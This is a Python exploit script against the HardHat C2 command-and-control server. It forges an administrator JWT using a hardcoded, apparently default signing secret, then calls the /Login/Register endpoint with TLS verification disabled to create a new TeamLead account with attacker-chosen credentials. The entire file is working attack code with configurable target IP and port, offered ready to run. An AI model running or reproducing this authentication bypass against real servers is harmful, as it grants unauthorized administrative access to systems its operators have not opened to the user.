import jwt
import uuid
import requests
import argparse
import urllib3
from datetime import datetime, timezone, timedelta

urllib3.disable_warnings()

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--user", help="User and password that will be created", default="github.com/thisisveryfunny")
parser.add_argument("-p", "--password", help="User and password that will be created", default="github.com/thisisveryfunny")
parser.add_argument("-i", "--ip", help="The IP of the HardHat C2 running on", default="127.0.0.1")
parser.add_argument("-P", "--port", help="The port of the HardHat C2 running on", default="5000")

args = parser.parse_args()
user = args.user
passwd = args.password
rhost = f'{args.ip}:{args.port}' # change the ip if necessary
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.now(timezone.utc)

expiration = now + timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
url = f"https://{rhost}/Login/Register"
_headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

_json = {
    "password": passwd,
    "role": "TeamLead",
    "username": user
}
r = requests.post(url, headers=_headers, json=_json, verify=False)
if r.status_code == 200:
    print("[+] User created !")
    print("[+] Use", user, "as the username and", passwd, " as the password to login in HardHat C2!")
else:
    print("[!] User creation failed.")
